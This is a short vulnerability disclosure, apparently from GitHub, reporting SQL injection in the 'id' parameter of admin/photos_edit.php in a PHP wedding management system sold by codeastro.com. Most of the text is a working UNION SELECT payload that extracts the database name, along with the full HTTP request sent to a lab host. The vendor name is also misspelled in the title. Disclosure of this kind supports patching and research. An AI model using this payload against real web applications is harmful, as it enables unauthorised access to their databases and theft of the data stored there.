# Wedding Management System v1.0 by codeastr.com has SQL injection

vendors: https://codeastro.com/wedding-management-system-in-php-with-source-code/

Vulnerability File: \admin\photos_edit.php

Vulnerability location: /Wedding-Management/admin/photos_edit.php?id=, id

[+] Payload: id=-37%20union%20select%201,2,database(),4,5,6,7,8,9,10--+

dbname = dbwedding

```sql
GET /Wedding-Management/admin/photos_edit.php?id=-37%20union%20select%201,2,database(),4,5,6,7,8,9,10--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/167984511-004cca98-4acd-4db5-97fd-aa55a25aae76.png)

![image](https://user-images.githubusercontent.com/54017627/167984531-900b25b5-cdd1-442a-b224-ee4d53b3ef53.png)
